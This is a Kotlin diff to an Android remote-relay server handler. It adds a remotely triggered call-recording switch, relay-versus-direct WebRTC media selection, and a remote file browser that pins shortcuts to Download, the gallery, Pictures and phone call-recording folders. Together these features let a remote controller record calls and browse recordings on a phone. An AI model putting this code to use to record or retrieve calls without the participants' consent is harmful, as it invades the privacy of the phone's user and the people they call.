@@ -226,6 +226,13 @@ object RelayServerHandler {
             when (cmd) {
                 RelayCommands.CMD_GET_CONFIG -> RelayCommands.RSP_CONFIG to success(handleConfig())
 
+                // ★ 2026-08-11 设置参数下发（控制端"设置"窗口，如通话录音）：保存到配置并反馈
+                RelayCommands.CMD_SETTINGS_SET -> {
+                    val ok = handleSettingsSet(payloadText)
+                    if (ok) RelayCommands.RSP_SETTINGS_SET to "1|success|设置成功"
+                    else RelayCommands.RSP_SETTINGS_SET to "0|failed|设置保存失败"
+                }
+
                 // ★ ZeroTier直连请求（中继在线时触发）：负载 "目标ZT IP|控制端ZT IP|端口"
                 RelayCommands.CMD_ZT_DIRECT_CONNECT -> {
                     val parts = payloadText.split("|")
@@ -584,11 +591,17 @@ object RelayServerHandler {
                     val mgr = WebRtcSessionManager(App.context)
                     webrtc = mgr
                     val cb = makeWebrtcSignalingCallback(s)
-                    Log.i(TAG, "★ [WebRTC OFFER IN] 开始异步启动 WebRtcSessionManager.startWithOffer...")
+                    // ★★★ 2026-08-12 中继优先模式：OFFER经中继到达(CHANNEL_RELAY)→relayPreferred=true
+                    //   （媒体走TURN中继转发）；经ZT直连/直连监听到达(CHANNEL_ZT/DIRECT)→relayPreferred=false
+                    //   （媒体走ZT/WiFi host直连兜底）。符合"中继优先，中继不可用时才ZT直连"。
+                    val relayPreferred = (channel == CHANNEL_RELAY)
+                    Log.i(TAG, "★ [WebRTC OFFER IN] 开始异步启动 WebRtcSessionManager.startWithOffer"
+                        + " channel=$channel relayPreferred=$relayPreferred"
+                        + "（${if (relayPreferred) "中继优先→媒体走TURN中继" else "直连兜底→媒体走ZT/WiFi直连"}）...")
                     // 启动放到子线程（createAnswer/setRemoteDescription 会阻塞）
                     Thread {
                         try {
-                            mgr.startWithOffer(idx, offerB64, cb)
+                            mgr.startWithOffer(idx, offerB64, cb, relayPreferred)
                             Log.i(TAG, "★ [WebRTC OFFER IN] startWithOffer 线程执行完毕（ANSWER 将由 signaling callback 异步发送）")
                         } catch (t: Throwable) {
                             Log.e(TAG, "★ [WebRTC OFFER IN] startWithOffer 异常: type=${t.javaClass.name} msg=${t.message}", t)
@@ -667,6 +680,34 @@ object RelayServerHandler {
         }
     }
 
+    /**
+     * ★ 2026-08-11 处理设置参数下发（负载JSON，如 {"callRecord":true}）
+     * 保存到配置（RelaySettings）并应用：通话录音开关→启动/停止通话录音监听
+     */
+    private fun handleSettingsSet(payloadText: String): Boolean {
+        return try {
+            val map: Map<String, Any>? = gson.fromJson(
+                payloadText,
+                object : com.google.gson.reflect.TypeToken<Map<String, Any>>() {}.type
+            )
+            if (map?.containsKey("callRecord") == true) {
+                val v = (map["callRecord"] as? Boolean) ?: false
+                RelaySettings.callRecord = v
+            }
+            // 应用设置：通话录音开启→启动监听（通话接通自动录音）；关闭→停止
+            if (RelaySettings.callRecord) {
+                CallRecordManager.start(App.context)
+            } else {
+                CallRecordManager.stop()
+            }
+            Log.i(TAG, "★ 收到控制端设置下发: callRecord=${RelaySettings.callRecord}")
+            true
+        } catch (e: Exception) {
+            Log.e(TAG, "处理设置下发失败: ${e.message}")
+            false
+        }
+    }
+
     private fun handleConfig(): ConfigData {
         // 获取卡槽信息
         if (App.SimInfoList.isEmpty()) {
@@ -707,6 +748,25 @@ object RelayServerHandler {
     private val FS_GALLERY_DIR = "/storage/emulated/0/DCIM/Camera"
 
     /**
+     * ★ 2026-08-11 查找手机自带"录音机"App保存录音文件的目录（取第一个存在，用于根目录"录音"快捷入口）
+     * 优先MIUI录音机（红米/小米），其次标准MediaStore录音目录、本App通话录音保存目录
+     */
+    private fun findRecordingsDir(): String {
+        val candidates = listOf(
+            "/storage/emulated/0/MIUI/sound_recorder/call_rec",   // MIUI 录音机-通话录音
+            "/storage/emulated/0/MIUI/sound_recorder",            // MIUI 录音机
+            "/storage/emulated/0/Music/Recordings/CallRecord",    // 本App通话录音(MediaStore)
+            "/storage/emulated/0/Recordings/CallRecord",          // 标准通话录音目录
+            "/storage/emulated/0/Recordings",                     // 标准录音目录(Android 10+)
+            "/storage/emulated/0/Recorder",                       // 部分ROM录音机
+        )
+        for (c in candidates) {
+            if (File(c).exists()) return c
+        }
+        return "/storage/emulated/0/Recordings"
+    }
+
+    /**
      * 过滤系统/隐藏/无权限目录：隐藏目录(.开头)、Android系统目录、不可读目录
      * 根目录下不显示这些目录，避免用户误操作或看到无意义的系统目录
      */
@@ -728,8 +788,23 @@ object RelayServerHandler {
             return "[]"
         }
         val list = ArrayList<Map<String, Any>>()
-        // ★ 根目录最上面加"图库"目录，点击直接进入图库目录
-        if (file.absolutePath == FS_DEFAULT_ROOT) {
+        // ★ 根目录顶部固定顺序（2026-08-11）：Download、图库、Pictures、录音，其余目录按字母排序在后
+        val rootFixed = file.absolutePath == FS_DEFAULT_ROOT
+        val rootFixedNames = HashSet<String>()
+        if (rootFixed) {
+            // 第1行：Download（Download的父目录即根目录）
+            val dl = File(FS_DEFAULT_ROOT, "Download")
+            if (dl.exists() && dl.isDirectory) {
+                list.add(linkedMapOf(
+                    "name" to "Download",
+                    "type" to "D",
+                    "size" to 0L,
+                    "mtime" to dl.lastModified(),
+                    "path" to dl.absolutePath
+                ))
+                rootFixedNames.add("Download")
+            }
+            // 第2行：图库（点击直接进入图库目录）
             list.add(linkedMapOf(
                 "name" to "图库",
                 "type" to "D",
@@ -737,12 +812,35 @@ object RelayServerHandler {
                 "mtime" to 0L,
                 "path" to FS_GALLERY_DIR
             ))
+            // 第3行：Pictures（放到图库下面）
+            val pic = File(FS_DEFAULT_ROOT, "Pictures")
+            if (pic.exists() && pic.isDirectory) {
+                list.add(linkedMapOf(
+                    "name" to "Pictures",
+                    "type" to "D",
+                    "size" to 0L,
+                    "mtime" to pic.lastModified(),
+                    "path" to pic.absolutePath
+                ))
+                rootFixedNames.add("Pictures")
+            }
+            // 第4行：录音（快捷打开手机自带录音机目录，查找通话录音文件）
+            val recDir = findRecordingsDir()
+            val recFile = File(recDir)
+            list.add(linkedMapOf(
+                "name" to "录音",
+                "type" to "D",
+                "size" to 0L,
+                "mtime" to if (recFile.exists()) recFile.lastModified() else 0L,
+                "path" to recDir
+            ))
         }
         try {
             val children = file.listFiles()
             if (children != null) {
                 // 正常路径：listFiles() 可用
-                children.filter { it.isDirectory && isFsVisibleDir(it) }.sortedBy { it.name.lowercase() }.forEach {
+                children.filter { it.isDirectory && isFsVisibleDir(it) && !rootFixedNames.contains(it.name) }
+                    .sortedBy { it.name.lowercase() }.forEach {
                     list.add(linkedMapOf(
                         "name" to it.name,
                         "type" to "D",
@@ -766,8 +864,10 @@ object RelayServerHandler {
                 // 使用 ls -la 命令列目录，ls 通过 POSIX readdir() 访问文件系统
                 Log.w(TAG, "listFiles()返回null(scoped storage限制): $dir, isExternalStorageManager=${android.os.Environment.isExternalStorageManager()}")
                 val lsItems = listFilesWithLs(dir)
+                // 根目录时过滤已固定前置的条目，避免重复
+                val lsFiltered = if (rootFixed) lsItems.filter { !rootFixedNames.contains(it["name"]) } else lsItems
                 // 排序：目录在前、文件在后，各自按名称排序
-                lsItems.sortedWith(compareBy(
+                lsFiltered.sortedWith(compareBy(
                     { if (it["type"] == "D") 0 else 1 },
                     { (it["name"] as String).lowercase() }
                 )).forEach { list.add(it) }
